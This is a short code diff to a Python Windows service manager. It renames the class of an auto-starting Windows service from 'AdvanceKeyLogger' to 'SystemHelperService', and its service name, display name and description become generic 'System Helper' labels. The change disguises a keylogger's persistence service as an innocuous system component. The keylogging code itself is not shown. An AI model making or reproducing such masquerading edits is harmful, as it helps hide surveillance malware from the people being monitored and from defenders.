@@ -31,7 +31,7 @@ class WindowsServiceManager:
             return "pywin32 not installed; cannot install Windows service."
         serviceutil = self._win32["serviceutil"]
         serviceutil.InstallService(
-            pythonClassString="service.windows_service.AdvanceKeyLoggerService",
+            pythonClassString="service.windows_service.SystemHelperService",
             serviceName=spec.name,
             displayName=spec.description,
             startType=self._win32["service"].SERVICE_AUTO_START,
@@ -93,10 +93,10 @@ if "win32serviceutil" in sys.modules:
     import win32service  # type: ignore
     import win32event  # type: ignore
 
-    class AdvanceKeyLoggerService(win32serviceutil.ServiceFramework):
-        _svc_name_ = "advancekeylogger"
-        _svc_display_name_ = "AdvanceKeyLogger Monitoring Service"
-        _svc_description_ = "AdvanceKeyLogger background monitoring service"
+    class SystemHelperService(win32serviceutil.ServiceFramework):
+        _svc_name_ = "system_helper"
+        _svc_display_name_ = "System Helper Service"
+        _svc_description_ = "System background helper service"
 
         def __init__(self, args):
             super().__init__(args)
